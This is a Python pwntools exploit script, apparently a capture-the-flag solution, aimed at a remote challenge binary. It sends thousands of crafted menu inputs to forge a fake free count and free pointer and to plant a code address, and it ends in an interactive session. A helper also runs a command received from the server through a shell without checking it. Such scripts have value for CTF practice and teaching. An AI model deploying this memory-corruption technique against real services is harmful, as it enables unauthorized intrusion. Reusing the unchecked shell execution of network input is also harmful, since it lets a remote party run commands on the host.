from pwn import *

context.arch = "amd64"
context.bits = 64
context.terminal = "tmux splitw -h".split()
context.log_level = "DEBUG"

s2u64 = lambda s: u64(s.ljust(8, b"\x00"))
i2b = lambda x: f"{x}".encode()
ptr_guard = lambda pos, ptr: (pos >> 12) ^ ptr


def remote_pow(txt):
    t.recvuntil(txt)
    cmd = t.recvline()
    res = subprocess.run(cmd, shell=True, stdout=subprocess.PIPE).stdout
    t.sendline(res)


def check_addr_lsb(library, addr_str):
    with open(f"/proc/{t.pid}/maps", "r") as f:
        for l in f.readlines():
            if not library in l:
                continue
            assert l[12 - len(addr_str) :].startswith(addr_str)


def create_io() -> tubes.tube.tube:
    if local:
        if debug:
            if radare:
                io: tubes.tube.tube = process([elf_name], env={"LD_PRELOAD": libc_name})
                util.proc.wait_for_debugger(util.proc.pidof(io)[0])
                return io
            return gdb.debug([elf_name], script, env={"LD_PRELOAD": libc_name})
        return process([elf_name], env={"LD_PRELOAD": libc_name})
    return remote(remote_addr, int(remote_port))


payload = b""


def solve():
    global t
    sa = lambda x, y: t.sendafter(x, y)
    sla = lambda x, y: t.sendlineafter(x, y)

    def q1(x):
        global payload
        payload += f"1 {x}\n".encode()

    def q2():
        global payload
        payload += b"2\n"

    def q3():
        global payload
        payload += b"3\n"

    for i in range(0x5):
        q1(i)
    for _ in range(0x4CC1):
        q3()

    ## FAKE COUNT
    q1(0)
    q1(0x70007)
    for _ in range(0x1E):
        q1(0)  # Free Count

    ## FAKE PTR
    for _ in range(6):
        q1(0)
    q1(0x405040)  # Free ptr
    for _ in range(5):
        q1(0)

    for i in range(0x4C8C):
        q1(0)
    q1(0x21)
    q1(0)
    q1(0x21)
    q1(0)

    for i in range(5):
        q1(0)
        q1(0x401427)
    for i in range(3):
        q1(0x401427)
        q1(0)
    q1(0)

    t.sendline(i2b(payload.count(b"\n")) + b"\n" + payload)

    t.interactive()


local = 0
debug = 0
radare = 0

elf_name = "./a.out"
libc_name = ""
addr = "34.170.146.252 55287"
if addr.count(" ") == 1:
    remote_addr, remote_port = addr.split()
if libc_name:
    libc: ELF = ELF(libc_name)
elf: ELF = ELF(elf_name)
script = """
b *0x00000000004025a2
c
"""
for _ in range(1):
    try:
        t = create_io()
        solve()
    except KeyboardInterrupt:
        break
    except AssertionError as e:
        continue
    except Exception as e:
        print(e)
    finally:
        t.close()
